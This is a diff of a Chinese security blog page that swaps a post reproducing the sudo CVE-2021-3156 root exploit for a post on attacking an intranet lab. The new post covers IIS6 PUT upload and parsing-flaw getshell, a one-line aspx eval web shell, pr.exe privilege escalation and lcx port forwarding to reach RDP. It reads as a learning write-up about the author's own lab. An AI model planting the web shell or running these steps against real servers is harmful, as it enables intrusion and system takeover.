@@ -46,26 +46,34 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>sudo缓冲区溢出提权（CVE-2021-3156） | 从安的博客</title>
+  <title>内网渗透学习一 | 从安的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="漏洞描述  在sudo中发现了严重的基于堆的缓冲区溢出，任何本地用户均可利用此溢出。当sudo通过-s或-i命令行选项在shell模式下 运行命令时，它将在命令参数中使用反斜杠转义特殊字符。如果命令在外壳模式下运行，那么sudoers策略插件将在评估sudoers策略（不希望使用转义字符）之前从参数中删除转义字符。只要存在sudoers文件（通常是 &#x2F;etc&#x2F;sudoers），攻击者就可以使用本地">
+  <meta name="description" content="内网渗透环境搭建1、2003server 域靶机环境    Iis62、2008server 域控3、Windows7 域环境靶机    phpstudy4、Ubuntu 靶机    安装软件        apt update        apt-get install -y vim ssh docker.io    开机启动ssh        Systemctl start ssh">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sudo缓冲区溢出提权（CVE-2021-3156）">
-<meta property="og:url" content="http://example.com/2021/02/13/sudo%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83(CVE-2021-3156)/index.html">
+<meta property="og:title" content="内网渗透学习一">
+<meta property="og:url" content="http://example.com/2021/03/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E4%B8%80/index.html">
 <meta property="og:site_name" content="从安的博客">
-<meta property="og:description" content="漏洞描述  在sudo中发现了严重的基于堆的缓冲区溢出，任何本地用户均可利用此溢出。当sudo通过-s或-i命令行选项在shell模式下 运行命令时，它将在命令参数中使用反斜杠转义特殊字符。如果命令在外壳模式下运行，那么sudoers策略插件将在评估sudoers策略（不希望使用转义字符）之前从参数中删除转义字符。只要存在sudoers文件（通常是 &#x2F;etc&#x2F;sudoers），攻击者就可以使用本地">
+<meta property="og:description" content="内网渗透环境搭建1、2003server 域靶机环境    Iis62、2008server 域控3、Windows7 域环境靶机    phpstudy4、Ubuntu 靶机    安装软件        apt update        apt-get install -y vim ssh docker.io    开机启动ssh        Systemctl start ssh">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/02/23/IYNmsuf3THJLCkK.png">
-<meta property="og:image" content="https://i.loli.net/2021/02/23/IEkvJzOydmLiDr7.png">
-<meta property="og:image" content="https://i.loli.net/2021/02/23/YzBfEdtFiQDAxjW.png">
-<meta property="og:image" content="https://i.loli.net/2021/02/23/y73gJkTuY6LzRSx.png">
-<meta property="og:image" content="https://i.loli.net/2021/02/23/lDZpcNbMTraFYjq.png">
-<meta property="og:image" content="https://i.loli.net/2021/02/23/9TxXYy78BnvA2KG.png">
-<meta property="article:published_time" content="2021-02-13T03:37:32.000Z">
-<meta property="article:modified_time" content="2021-02-23T13:20:34.033Z">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/mR3eY1s48zrXMPN.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/hQbNWoZfPHrGa8j.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/T9t2gzHm4rbMI7B.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/2XVGv6cjCpau8JU.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/KqpntcDAWZUeibS.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/J8TrL3GNtoZ7hxl.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/15xZ37FkKNXEBVr.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/xutgvjQp3PFaiVR.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/XKlCN3T9FcgRQ4U.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/utB8cSC9XmyTdjq.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/SHhPE2G9oCFMYgW.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/VXxTIKqBMmiZ1Ac.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/5pIaVeQTEfGBwHN.png">
+<meta property="article:published_time" content="2021-03-15T03:13:15.000Z">
+<meta property="article:modified_time" content="2021-03-15T03:28:47.887Z">
 <meta property="article:author" content="从安">
+<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/02/23/IYNmsuf3THJLCkK.png">
+<meta name="twitter:image" content="https://i.loli.net/2021/03/15/mR3eY1s48zrXMPN.png">
   
     <link rel="alternative" href="/atom.xml" title="从安的博客" type="application/atom+xml">
   
@@ -208,40 +216,47 @@
                                             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
                                         </div>
                                         <div id="js-content" class="content-ll">
-                                            <article id="post-sudo缓冲区溢出提权(CVE-2021-3156)" class="article article-type-post " itemscope itemprop="blogPost">
+                                            <article id="post-内网渗透学习一" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      sudo缓冲区溢出提权（CVE-2021-3156）
+      内网渗透学习一
     </h1>
   
 
         
-        <a href="/2021/02/13/sudo%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83(CVE-2021-3156)/" class="archive-article-date">
-  	<time datetime="2021-02-13T03:37:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-13</time>
+        <a href="/2021/03/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E4%B8%80/" class="archive-article-date">
+  	<time datetime="2021-03-15T03:13:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>  在sudo中发现了严重的基于堆的缓冲区溢出，任何本地用户均可利用此溢出。当sudo通过-s或-i命令行选项在shell模式下 运行命令时，它将在命令参数中使用反斜杠转义特殊字符。如果命令在外壳模式下运行，那么sudoers策略插件将在评估sudoers策略（不希望使用转义字符）之前从参数中删除转义字符。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>sudo版本 1.7.7至1.7.10p9、1.8.2至1.8.31p2<br>sudo版本 1.9.0至1.9.5p1</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>ubuntu<br>Sudo 版本 1.8.21p2</p>
-<p><img src="https://i.loli.net/2021/02/23/IYNmsuf3THJLCkK.png" alt="sudo7.png"></p>
-<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">w@w-virtual-machine:~$ git <span class="built_in">clone</span> https://github.91chifun.workers.dev//https://github.com/blasty/CVE-2021-3156.git</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/02/23/IEkvJzOydmLiDr7.png" alt="sudo2.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">w@w-virtual-machine:~/CVE-2021-3156$ make</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/02/23/YzBfEdtFiQDAxjW.png" alt="sudo3.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">w@w-virtual-machine:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/02/23/y73gJkTuY6LzRSx.png" alt="sudo4.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">w@w-virtual-machine:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/02/23/lDZpcNbMTraFYjq.png" alt="sudo5.png"></p>
-<p>成功拿到root权限<br><img src="https://i.loli.net/2021/02/23/9TxXYy78BnvA2KG.png" alt="sudo6.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;nyG97PLTFK0KQrIHD0vzNQ</span><br><span class="line">https:&#x2F;&#x2F;www.sudo.ws&#x2F;alerts&#x2F;unescape_overflow.html</span><br></pre></td></tr></table></figure>
+        <h1 id="内网渗透环境搭建"><a href="#内网渗透环境搭建" class="headerlink" title="内网渗透环境搭建"></a>内网渗透环境搭建</h1><p>1、2003server 域靶机环境<br>    Iis6<br>2、2008server 域控<br>3、Windows7 域环境靶机<br>    phpstudy<br>4、Ubuntu 靶机<br>    安装软件<br>        apt update<br>        apt-get install -y vim ssh docker.io<br>    开机启动ssh<br>        Systemctl start ssh<br>        Systemctl enable ssh<br>    编辑 /lib/system/system/docker.service<br>        ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</p>
+<h1 id="模拟渗透"><a href="#模拟渗透" class="headerlink" title="模拟渗透"></a>模拟渗透</h1><h3 id="测试2003获取系统权限"><a href="#测试2003获取系统权限" class="headerlink" title="测试2003获取系统权限"></a>测试2003获取系统权限</h3><h2 id="利用iis-put上传漏洞进行getshell"><a href="#利用iis-put上传漏洞进行getshell" class="headerlink" title="利用iis put上传漏洞进行getshell"></a>利用iis put上传漏洞进行getshell</h2><p>通过抓包iis6数据包修改数据包头查看WEB服务器支持哪些请求方式<br><img src="https://i.loli.net/2021/03/15/mR3eY1s48zrXMPN.png" alt="nw1.png"></p>
+<p>修改GET为OPTIONS查看支持的请求方式<br><img src="https://i.loli.net/2021/03/15/hQbNWoZfPHrGa8j.png" alt="nw2.png"></p>
+<p>发现支持PUT的请求方式，利用PUT请求上传asp小马<br><img src="https://i.loli.net/2021/03/15/T9t2gzHm4rbMI7B.png" alt="nw3.png"></p>
+<p>利用COPY请求方式和iis6.0的解析漏洞获取getshell<br><img src="https://i.loli.net/2021/03/15/2XVGv6cjCpau8JU.png" alt="nw4.png"></p>
+<p>利用蚁剑或者中国菜刀连接asp马<br><img src="https://i.loli.net/2021/03/15/KqpntcDAWZUeibS.png" alt="nw5.png"></p>
+<p>上传aspx小马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;% <span class="built_in">eval</span>(Request.Item[<span class="string">&quot;pass&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>连接aspx小马后可执行命令<br><img src="https://i.loli.net/2021/03/15/J8TrL3GNtoZ7hxl.png" alt="nw6.png"></p>
+<p>上传pr.exe进行提权<br><img src="https://i.loli.net/2021/03/15/15xZ37FkKNXEBVr.png" alt="nw7.png"></p>
+<p>利用pr.exe创建一个管理员用户<br><img src="https://i.loli.net/2021/03/15/xutgvjQp3PFaiVR.png" alt="nw8.png"></p>
+<p>由于不能直接连接内网主机的3389端口，就利用LCX进行端口转发<br>在本机c盘放入一个lcx.exe，在服务器网站根目录也放一个lcx.exe<br><img src="https://i.loli.net/2021/03/15/XKlCN3T9FcgRQ4U.png" alt="nw9.png"><br><img src="https://i.loli.net/2021/03/15/utB8cSC9XmyTdjq.png" alt="nw10.png"></p>
+<p>在本机上使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lcx -listen 51 3399</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/03/15/SHhPE2G9oCFMYgW.png" alt="nw11.png"></p>
+<p>在服务器上使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lcx -slave 192.168.1.3 51 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/03/15/VXxTIKqBMmiZ1Ac.png" alt="nw12.png"></p>
+<p>然后连接192.168.1.3的3399端口连接到内网中的2003服务器的远程服务器<br><img src="https://i.loli.net/2021/03/15/5pIaVeQTEfGBwHN.png" alt="nw13.png"></p>
+<p>成功拿下内网中的2003服务器，后期将以这台2003服务器为跳板进行内网攻击</p>
+
       
 
       
@@ -270,6 +285,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -320,7 +346,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/02/13/sudo%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83(CVE-2021-3156)/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/03/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E4%B8%80/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -334,18 +360,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/03/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E4%B8%80/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          内网渗透学习一
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/01/31/qcms-XSS-SQL-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">qcms XSS+SQL+文件上传漏洞复现</div>
+    <a href="/2021/02/13/sudo%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83(CVE-2021-3156)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sudo缓冲区溢出提权（CVE-2021-3156）</div>
       <i class="icon-circle-right"></i>
     </a>
   
